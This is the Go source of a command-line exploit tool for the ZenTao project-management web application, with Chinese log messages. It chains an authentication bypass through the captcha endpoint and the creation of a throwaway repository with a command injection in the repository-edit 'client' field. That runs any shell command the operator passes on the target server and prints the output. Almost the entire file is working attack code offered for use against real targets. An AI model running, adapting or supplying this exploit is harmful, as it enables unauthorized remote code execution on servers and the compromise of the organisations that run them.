// @File    :   main.go
// @Time    :   2023/01/17 14:25:22
// @Author  :   _0xf4n9x_
// @Version :   1.0
// @Contact :   fanq.xu@gmail.com

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	neturl "net/url"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/projectdiscovery/gologger"
)

const banner = `
####### #######  #####                                           ######   #####  ####### 
     #     #    #     #   ##   #####  #####  ####  #    #   ##   #     # #     # #       
    #      #    #        #  #  #    #   #   #    # #    #  #  #  #     # #       #       
   #       #    #       #    # #    #   #   #      ###### #    # ######  #       #####   
  #        #    #       ###### #####    #   #      #    # ###### #   #   #       #       
 #         #    #     # #    # #        #   #    # #    # #    # #    #  #     # #       
#######    #     #####  #    # #        #    ####  #    # #    # #     #  #####  #######
`

var (
	h           bool
	url         string
	proxyURL    string
	command     string
	stdin       bool
	baseURL     string // Zentao WebRoot Path
	timeout     int
	requestType string
	zentaosid   string
	repoID      string
)

func showBanner() {
	gologger.Print().Msgf("%s\n", banner)
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0
	return isPipedFromChrDev || isPipedFromFIFO
}

func init() {
	flag.BoolVar(&h, "h", false, "显示帮助信息")
	flag.StringVar(&url, "u", "", "目标URL，例如：http://example.com")
	flag.StringVar(&proxyURL, "p", "", "使用代理，例如：http://127.0.0.1:8080")
	flag.StringVar(&command, "c", "", "期望被执行的命令")
	flag.IntVar(&timeout, "t", 15, "请求超时时间")
	flag.Parse()

	stdin = hasStdin()

	showBanner()

	// -h flag or no flag, no stdin
	if h || (len(os.Args) == 1 && !stdin) {
		flag.Usage()
		os.Exit(0)
	}

	// no url and no stdin
	if url == "" && !stdin {
		gologger.Error().Msg("目标不能为空，使用-h参数查看帮助信息。\n\n")
		os.Exit(0)
	}

	// stdin to url
	if stdin && url == "" {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			t := scanner.Text()
			if t == "" {
				continue
			}
			url = t
		}
	}

	// check url url format.
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		gologger.Error().Msg("请检查输入的目标URL格式！\n\n")
		os.Exit(0)
	}

	// no command
	if command == "" {
		gologger.Error().Msg("请输入要执行的命令！\n\n")
		os.Exit(0)
	}
}

func main() {
	gologger.Print().Label("INFO").Msg("Target URL: " + url)
	exploit(url, command, proxyURL)
}

func exploit(url string, command string, proxyURL string) bool {
	client := resty.New()
	client.SetTimeout(15 * time.Second)

	if proxyURL != "" {
		gologger.Print().Label("INFO").Msg("Proxy: " + proxyURL)
		client.SetProxy(proxyURL)
	}

	// 1. 确定正确完整的Zentao baseURL
	u, _ := neturl.Parse(url)
	paths := []string{"/", "/zentao/"}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36"

	zentaoPath := false
	for _, path := range paths {
		uri := u.Path + path
		baseURL = u.Scheme + "://" + u.Host + strings.Replace(uri, "//", "/", -1)
		baseResp, _ := client.R().
			SetHeader("User-Agent", userAgent).
			Get(baseURL)
		if baseResp.StatusCode() == 200 && strings.Contains(string(baseResp.Body()), "/user-login") {
			zentaoPath = true
			break
		}
	}
	if !zentaoPath {
		baseURL = url
		gologger.Print().Label("WARN").Msg("Zentao Web根路径未找到，使用输入的URL代替之。")
	} else {
		gologger.Print().Label("INFO").Msg("Zentao Web根路径: " + baseURL)
	}

	// 2. 获取请求类型
	configURL := baseURL + "?mode=getconfig"
	configResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		Get(configURL)

	if strings.Contains(string(configResp.Body()), "requestType\":") {
		var jsonResp map[string]interface{}
		_ = json.Unmarshal(configResp.Body(), &jsonResp)
		if strings.Contains(jsonResp["requestType"].(string), "PATH_INFO") {
			requestType = "PATH_INFO"
			gologger.Print().Label("INFO").Msg("requestType: " + requestType)
		} else if strings.Contains(jsonResp["requestType"].(string), "GET") {
			requestType = "GET"
			gologger.Print().Label("INFO").Msg("requestType: " + requestType)
		}
	} else {
		requestType = "PATH_INFO"
		gologger.Print().Label("WARN").Msg("requestType没有获取到，默认使用PATH_INFO")
	}

	referURL := baseURL + "index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM="

	// 3. 获取Cookie绕过认证
	captchaURL := baseURL + getURI("misc-captcha-user", requestType)
	captchaResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		SetHeader("Referer", referURL).
		Get(captchaURL)

	if captchaResp.StatusCode() == 200 && captchaResp.Header().Get("Content-Type") == "image/jpeg" {
		// zentaosid=a3adde2af35c975f042d0ee0fc349019; lang=zh-cn; device=desktop; theme=default
		cookies := string(captchaResp.Request.Header.Get("Cookie"))
		if strings.Contains(cookies, "zentaosid") {
			for _, v := range strings.Split(cookies, "; ") {
				if strings.Contains(v, "zentaosid") {
					zentaosid = strings.Split(v, "=")[1]
					gologger.Print().Label("INFO").Msg("zentaosid: " + zentaosid)
					break
				}
			}
		}
	} else {
		gologger.Error().Msg("尝试绕过认证失败。\n")
		os.Exit(0)
	}

	// 4. 创建仓库，并获取repoID
	createURL := baseURL + getURI("repo-create-123", requestType)
	createdata := fmt.Sprintf("SCM=Gitlab&client=foo&serviceHost=zentao.gitlab.com&serviceProject=%s&serviceToken=admin&path=123&product=%s&name=%s&encoding=UTF8", genRandStr(10), genRandStr(10), genRandStr(10))
	createResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		SetHeader("Referer", referURL).
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBody(createdata).
		Post(createURL)

	createbody := string(createResp.Body())
	if strings.Contains(createbody, "repo-showSyncCommit") {
		bodyArr := strings.Split(createbody, "-")
		repoID = bodyArr[len(bodyArr)-2]
	} else if strings.Contains(string(createResp.Body()), "showSyncCommit&repoID") {
		bodyArr := strings.Split(createbody, "&")
		repo := bodyArr[len(bodyArr)-2]
		repoArr := strings.Split(repo, "=")
		repoID = repoArr[len(repoArr)-1]
	} else {
		gologger.Error().Msg("repoID没有找到。\n")
		os.Exit(0)
	}
	gologger.Print().Label("INFO").Msg("repoID: " + repoID)

	// 5. 命令注入
	editURL := baseURL + getURI(fmt.Sprintf("repo-edit-%s", repoID), requestType)
	datas := []string{fmt.Sprintf("SCM=Subversion&client=`%s`&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123", command), fmt.Sprintf("SCM=Subversion&client=%s&gitlabHost=http://foo&gitlabProject=foo&gitlabToken=123&name=123&product=123&path=123", command)}

	for _, data := range datas {
		editResp, _ := client.R().
			SetHeader("User-Agent", userAgent).
			SetHeader("Referer", referURL).
			SetHeader("X-Requested-With", "XMLHttpRequest").
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			SetBody(data).
			Post(editURL)
		editbody := string(editResp.Body())

		if editResp.StatusCode() == 200 && strings.Contains(editbody, ": not found") {
			// 有回显情况
			var re = regexp.MustCompile(`(?m): 1: (.*): not found`)
			result := re.FindStringSubmatch(editbody)[1]
			gologger.Print().Label("INFO").Msg("Command: " + command)
			gologger.Print().Label("INFO").Msg("命令执行结果: " + result)
			return true
		} else if (editResp.StatusCode() == 200 && strings.Contains(editbody, "/user-deny-repo-edit") && strings.Contains(editbody, "self.location=")) || strings.Contains(editbody, `\u5ba2\u6237\u7aef\u5b89\u88c5\u76ee\u5f55\u4e0d\u80fd\u6709\u7a7a\u683c\uff01`) {
			// 无回显情况
			gologger.Print().Label("INFO").Msg("Command: " + command)
			gologger.Print().Label("INFO").Msg("当前命令执行可能无回显，请尝试使用带外方式。")
			return true
		} else {
			continue
		}
	}
	gologger.Print().Label("WARN").Msg("命令执行失败，后台命令执行漏洞可能已被修复。")

	return true
}

func getURI(path string, requestType string) string {
	if requestType == "PATH_INFO" {
		return path
	} else if requestType == "GET" {
		params := strings.Split(path, "-")
		if len(params) < 2 {
			return path
		}
		uri := fmt.Sprintf("?m=%s&f=%s", params[0], params[1]) // ?m=misc&f=captcha
		params = params[2:]
		for i, aParam := range params {
			uri += fmt.Sprintf("&arg%d=%s", i+1, aParam)
		}
		return uri // ?m=misc&f=captcha&arg1=user
	}
	return path
}

func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}
